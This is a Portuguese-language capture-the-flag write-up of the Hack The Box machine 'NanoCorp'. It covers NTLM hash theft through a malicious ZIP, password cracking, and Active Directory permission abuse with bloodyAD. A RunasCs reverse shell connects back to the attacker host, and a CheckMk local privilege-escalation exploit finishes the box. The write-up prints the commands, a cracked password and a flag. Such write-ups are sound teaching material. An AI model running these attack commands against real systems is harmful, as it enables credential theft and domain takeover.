---
title: "NanoCorp - HTB"
date: 2025-11-09
summary: "Na máquina NanoCorp, o acesso inicial foi obtido via NTLM Relay, concedendo um usuário com permissões elevadas. Com isso, foi possível comprometer outro usuário com acesso remoto. Após a conexão, explorou-se uma vulnerabilidade (CVE) no Check Mk, resultando em execução remota de código (RCE) com privilégios de Administrator."
layout: "single"
tags: ["Windows", "Hard", "HTB"]
draft: true
---

## Resumo

A NanoCorp é uma máquina de nível Hard com ataques diversificados. Conseguimos o foothold através de um `NTLM Relay`, o que nos leva a um usuário com permissões perigosas, permitindo assim, obtermos outro usuário que possui permissão de login remoto. Após nos conectarmos ao alvo, abusamos de uma CVE no `Check Mk` que nos permite obter um RCE como Administrator.

Achei essa máquina bem simples e repetitiva, porém vale o tempo gasto para reforçar alguns conceitos.

## Recon inicial

Iniciaremos o recon como sempre, partindo inicialmente do scan de portas com o [Rustscan](https://github.com/bee-san/RustScan):
```bash
rustscan -a 10.129.129.243 -u 5000 -- -sV

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-11-09 03:24:49Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: nanocorp.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: nanocorp.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5986/tcp  open  ssl/http      syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49671/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
54970/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
54978/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
55000/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Hosts: nanocorp.htb, DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```
Analisando o output, vemos dois pontos importantes: temos um website rodando na porta 80 e que o WinRm padrão está desabilitado, disponiblizando apenas o WinRm com SSL. Também encontramos o nome do host: `nanocorp.htb` e o nome do dc: `DC01`. Irei adicionar eles no meu `/etc/hosts`:
```bash
> nano /etc/hosts

10.129.129.243  DC01.nanocorp.htb nanocorp.htb
```

Após a configuração, estarei acessando a porta 80 da máquina. Ao acessar nos deparamos com o seguinte website:

![website](https://res.cloudinary.com/dmx1j4rjb/image/upload/v1762633877/666ada42-7bbc-453a-b739-c7354fd281ac.png)

Analisando a pagina, encontramos o subdominio `hire.nanocorp.htb`:

![sub](https://res.cloudinary.com/dmx1j4rjb/image/upload/v1762634143/241126a2-e7cb-493b-ba4d-417effb338a3.png)

Adicionando ele no `/etc/hosts` e acessando, nos deparamos com o seguinte formulário:

![form](https://res.cloudinary.com/dmx1j4rjb/image/upload/v1762634225/30c73e44-48a8-4f9c-b3c3-1debfbfdc0ee.png)


## User Flag
### Abusando de um NTLM Relay Para obter o usuário WEB_SVC

Após enviarmos um arquivo aceito, recebemos uma mensagem dizendo que será revisado posteriormente, o que me da uma ideia de um ataque conhecido, a [CVE-2025-24071](https://github.com/0x6rss/CVE-2025-24071_PoC). Essa CVE consiste em um roubo de NTLM utilizando o ZIP.

Utilizando o PoC do github:
```bash
> python3 script.py                                                                                                                   
Enter your file name: payload                                                                                                                                                                    
Enter IP (EX: 192.168.1.162): 10.10.14.44                                                                                                                                                     
completed   
```

E enviando o arquivo com o Responder iniciado, conseguimos a seguinte hash:
```bash
[SMB] NTLMv2-SSP Client   : 10.129.129.243
[SMB] NTLMv2-SSP Username : NANOCORP\web_svc
[SMB] NTLMv2-SSP Hash     : web_svc::NANOCORP:1122334455667788:21C4CBDB34D2EF046C3900283E333B40:010100000000000080AB7EAED750DC015AE8E7DF1E0373B10000000002000800430047004100350001001E00570049004E002D004E003100310053004C004E004D00360054003500500004003400570049004E002D004E003100310053004C004E004D0036005400350050002E0043004700410035002E004C004F00430041004C000300140043004700410035002E004C004F00430041004C000500140043004700410035002E004C004F00430041004C000700080080AB7EAED750DC010600040002000000080030003000000000000000000000000020000014245C9B9B71056913CB5C5AA27447CD59F07194B00707C672AE342B750804810A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00340034000000000000000000
```

Podemos usar o `John` ou o `Hashcat` para quebrar a hash. No meu caso estarei usando o `John` mesmo:
```bash
john --wordlist=`fzf-wordlists` hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
dksehdgh712!@#   (web_svc)     
1g 0:00:00:01 DONE (2025-11-08 17:52) 0.9524g/s 1767Kp/s 1767Kc/s 1767KC/s dobson1156..djcuco69
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```

Agora com um usuário de dentro do AD, conseguimos enumerar o AD completamente. Para isso estarei usando o [bloodhound-python](https://github.com/dirkjanm/BloodHound.py) e o [Bloodhound-legacy](https://github.com/SpecterOps/BloodHound-Legacy) para digerir os dados:
```bash
bloodhound-python -u web_svc -p 'dksehdgh712!@#' -d nanocorp.htb -ns 10.129.129.243  -c ALL --zip

INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)                          
INFO: Found AD domain: nanocorp.htb                                                            
INFO: Getting TGT for user         
INFO: Connecting to LDAP server: dc01.nanocorp.htb                  
INFO: Found 1 domains                                                                          
INFO: Found 1 domains in the forest 
INFO: Found 1 computers            
INFO: Connecting to LDAP server: dc01.nanocorp.htb                           
INFO: Found 6 users                
INFO: Found 53 groups                                                                          
INFO: Found 2 gpos                                                                             
INFO: Found 2 ous                  
INFO: Found 19 containers
INFO: Found 0 trusts               
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.nanocorp.htb
INFO: Done in 00M 29S
INFO: Compressing output into 20251109005543_bloodhound.zip                                                                        
```

### Abusando de Permissões Mal Configuradas Para Obter o MONITORING_SVC

Analisando os outbounds do WEB_SVC, vemos que ele possui a permissão `AddSelf` no grupo `IT_SUPPORT` e consequentemente recebe `ForceChangePassword` sobre o usuário MONITORING_SVC que faz parte do grupo `Remote Management Users` permitindo login remoto:

![bloodhound](https://res.cloudinary.com/dmx1j4rjb/image/upload/v1762635748/fdf4f58c-cf29-455e-a8bc-972911acbe52.png)

Para iniciarmos essa cadeia de ataques, estarei usando o [bloodyAD](https://github.com/CravateRouge/bloodyAD) para inicialmente nos adicionarmos no grupo `IT_SUPPORT`:
```bash
bloodyAD -d "nanocorp.htb" --host "DC01.nanocorp.htb" --dc-ip "10.129.129.243" -u 'web_svc' -p 'dksehdgh712!@#' add groupMember 'IT_SUPPORT' 'web_svc'

[+] web_svc added to IT_SUPPORT
```

Agora para alterar a senha do MONITORING_SVC, estarei novamente usando o `BloodyAD`:
```bash
bloodyAD -d "nanocorp.htb" --host "DC01.nanocorp.htb" --dc-ip "10.129.129.243" -u 'web_svc' -p 'dksehdgh712!@#' set password 'MONITORING_SVC' 'Piroquinha123!'

[+] Password changed successfully!
```

E com isso, conseguimos solicitar um o TGT do MONITORING_SVC:
```bash
getTGT.py nanocorp.htb/'monitoring_svc':'Piroquinha123!'
Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in monitoring_svc.ccache
```
{{< alert >}}
**Como o MONITORING_SVC faz parte do grupo `Protected Users`, não conseguimos usar apenas a senha dele para se autenticar com NTLM, por esse motivo solicitamos o TGT dele.**
{{< /alert >}}

Com esse TGT conseguimos podemos fazer login remotamente na máquina, porém não da maneira tradicional com o `Evil-WinRM`. Como vimos la no inicio, o `WinRm` via `HTTP` está desabilitado, restando apenas o `WinRM` via `HTTPS/SSL`, e para se conectar através dessa porta, precisaremos de "outra versão" do `Evil-WinRM`. Estarei utlizando o [Winrmexec](https://github.com/ozelis/winrmexec) para isso:
```bash
python winrmexec.py -ssl -port 5986 -k nanocorp.htb/monitoring_svc@DC01.nanocorp.htb -no-pass
'prompt_toolkit' not installed, using built-in 'readline'
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] '-target_ip' not specified, using DC01.nanocorp.htb
[*] '-url' not specified, using https://DC01.nanocorp.htb:5986/wsman
[*] using domain and username from ccache: NANOCORP.HTB\monitoring_svc
[*] '-spn' not specified, using HTTP/DC01.nanocorp.htb@NANOCORP.HTB
[*] '-dc-ip' not specified, using NANOCORP.HTB
PS C:\Users\monitoring_svc\Documents> 
```

E com isso, conseguimos a flag user.

## Root Flag

### Utilizando o Runas Para Obter a Shell do WEB_SVC

Analisando os softwares da máquina, vemos que tem um fora do padrão:
```bash
PS C:\Program Files (x86)> Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*, HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Sort-Object DisplayName | Select-Object DisplayName, DisplayVersion | Format-Table -AutoSize

DisplayName                                                        DisplayVersion 
-----------                                                        -------------- 
Check MK Agent 2.1  <------                                        2.1.0.50010  <-------  
Microsoft Edge                                                     86.0.622.38    
Microsoft Edge Update                                              1.3.135.41     
Microsoft Visual C++ 2015-2022 Redistributable (x64) - 14.36.32532 14.36.32532.0  
Microsoft Visual C++ 2015-2022 Redistributable (x86) - 14.36.32532 14.36.32532.0  
Microsoft Visual C++ 2022 X64 Additional Runtime - 14.36.32532     14.36.32532    
Microsoft Visual C++ 2022 X64 Minimum Runtime - 14.36.32532        14.36.32532    
Microsoft Visual C++ 2022 X86 Additional Runtime - 14.36.32532     14.36.32532    
Microsoft Visual C++ 2022 X86 Minimum Runtime - 14.36.32532        14.36.32532    
VMware Tools                                                       12.4.5.23787635
WinRAR 7.11 (64-bit)                                               7.11.0        
```

Pesquisando sobre essa versão, encontramos a [CVE-2024-0670](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/) que nos permite abusar do `Check Mk` para escalar privilégios. Porém para isso precisamos de acesso a pasta `C:\Windows\Temp` e o nosso usuário MONITORING_SVC não tem acesso a ela:
```bash
> PS C:\users\monitoring_svc\Desktop> ls c:\windows\temp

Access to the path 'C:\windows\temp' is denied.
```
Então precisaremos de outro usuário para fazer esse ataque. Como ja temos a senha do WEB_SVC podemos usar o [RunasCs](https://github.com/antonioCoco/RunasCs) para pegar uma shell com ele:
```bash
PS C:\users\monitoring_svc\Desktop> ./runas.exe web_svc 'dksehdgh712!@#' powershell.exe -r 10.10.14.44:5555

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-13d5049$\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 240 created in background.
```
```bash
rlwrap nc -lvnp 5555

Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::5555
Ncat: Listening on 0.0.0.0:5555
Ncat: Connection from 10.129.129.243.
Ncat: Connection from 10.129.129.243:57265.
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> 
```
Com a shell do WEB_SVC, conseguimos acesso ao `C:\Windows\Temp`:
```bash
PS C:\windows\temp> ls                                                                                                 
                                                                                                                                                            
Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----                                                                  
d-----         11/3/2025   5:05 PM                vmware-SYSTEM                                                         
-a----         11/8/2025   7:04 PM             53 af397ef28e484961ba48646a5d38cf54.db.ses                               
-a----         11/8/2025   7:04 PM              0 mat-debug-5952.log                                                    
-a----         11/8/2025   7:52 PM          32196 MpCmdRun.log                                                           
-a----         11/8/2025   7:03 PM            102 silconfig.log                                                         
-a----         11/4/2025   3:20 PM         189079 vmware-vmsvc-SYSTEM.log                                               
-a----         11/4/2025   3:18 PM          16602 vmware-vmtoolsd-Administrator.log                                     
-a----         11/8/2025   7:02 PM          20998 vmware-vmtoolsd-SYSTEM.log                                            
-a----         11/8/2025   7:19 PM           4891 vmware-vmtoolsd-web_svc.log                                           
-a----         11/4/2025   3:20 PM          66145 vmware-vmusr-Administrator.log                                        
-a----         11/8/2025   7:19 PM           5980 vmware-vmusr-web_svc.log                                              
-a----         11/8/2025   7:02 PM          20132 vmware-vmvss-SYSTEM.log          
```

Agora conseguimos abusar da CVE. Para isso irei fazer o procedimento mostrado no website da CVE, porém ao invés de usar o `msfvenom` para criar um .exe, irei usar apenas um .bat para pegar a flag do Administrator. Estarei usando o seguinte .bat:
```bash
@echo off
SET SOURCE_FILE=C:\users\administrator\desktop\root.txt
SET DEST_FILE=C:\windows\temp\root.txt

TYPE "%SOURCE_FILE%" > "%DEST_FILE%"
:EOF
```

Enviarei esse arquivo para a máquina e darei permissão completa para todo mundo:
```bash
icacls script.bat /grant Everyone:F

C:\windows\temp\script.bat: Successfully processed
Successfully processed 1 files; Failed processing 0 files
```

Agora precisamos rodar o seguinte comando para o exploit funcionar:
```bash
1000..10000 | foreach {copy C:\windows\temp\script.bat C:\Windows\Temp\cmk_all_${_}_1.cmd; Set-ItemProperty -path C:\Windows\Temp\cmk_all_${_}_1.cmd -name IsReadOnly -value $true;}
```

Esse comando irá copiar o `script.bat`, copiar ele em vários arquivos com nome de `cmk_all_X-VALOR_1.cmd` de 1000 a 10000 e vai configurar para que esses arquivos sejam de apenas leitura, sem a possíbilidade de escrita. Esse arquivo é padrão do `CheckMk`, ou seja, criando esses arquivos antes de rodar o `CheckMk`, conseguimos fazer com que ele rode o `script.bat` porque ele irá aceitar esse arquivo como próprio dele.

E agora para triggar esse `script.bat`, usamos o seguinte comando:
```bash
Start-Process "msiexec" -ArgumentList "/fa C:\Windows\Installer\1e6f2.msi"
```
{{< alert >}}
**Esse arquivo .msi altera de máquina para máquina, você precisa dar uma olhada na pasta `C:\Windows\Installer\` para saber o nome correto.**
{{< /alert >}}

Após iniciar o processo, é só aguardar um pouco e dar um cat no `C:\Windows\Temp\root.txt`:
```bash
PS C:\windows\temp> cat "C:\windows\temp\root.txt"

65670f34acb8213b33802d334db105dc
```

E com isso finalizamos a máquina.